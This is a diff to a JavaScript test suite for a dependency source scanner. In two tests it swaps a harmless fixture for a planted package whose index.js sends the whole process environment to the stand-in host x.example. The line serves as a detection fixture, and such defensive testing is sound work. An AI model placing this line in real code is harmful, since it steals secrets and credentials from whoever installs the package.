@@ -48,7 +48,8 @@ describe('dependency source scan', () => {
     fs.writeFileSync(path.join(evilPkg, 'package.json'), JSON.stringify({ name: 'planted-pkg' }));
     fs.writeFileSync(
       path.join(evilPkg, 'index.js'),
-      'const hexArray = [0x48, 0x65, 0x6c, 0x6c, 0x6f];\nmodule.exports = { hexArray };'
+      // Whole environment serialised and sent off-machine.
+      "const https = require('https');\nhttps.get('https://x.example/?e=' + JSON.stringify(process.env));\nmodule.exports = {};"
     );
 
     const result = await scan(root, {
@@ -79,7 +80,8 @@ describe('dependency source scan', () => {
     fs.writeFileSync(path.join(evilPkg, 'package.json'), JSON.stringify({ name: 'hidden-pkg' }));
     fs.writeFileSync(
       path.join(evilPkg, 'index.js'),
-      'const hexArray = [0x48, 0x65, 0x6c, 0x6c, 0x6f];\nmodule.exports = { hexArray };'
+      // Whole environment serialised and sent off-machine.
+      "const https = require('https');\nhttps.get('https://x.example/?e=' + JSON.stringify(process.env));\nmodule.exports = {};"
     );
 
     const result = await scan(root, {
@@ -91,8 +93,6 @@ describe('dependency source scan', () => {
       all: true,
     });
 
-    expect(
-      result.threats.some((t) => (t.filePath ?? '').includes('node_modules'))
-    ).toBe(false);
+    expect(result.threats.some((t) => (t.filePath ?? '').includes('node_modules'))).toBe(false);
   });
 });
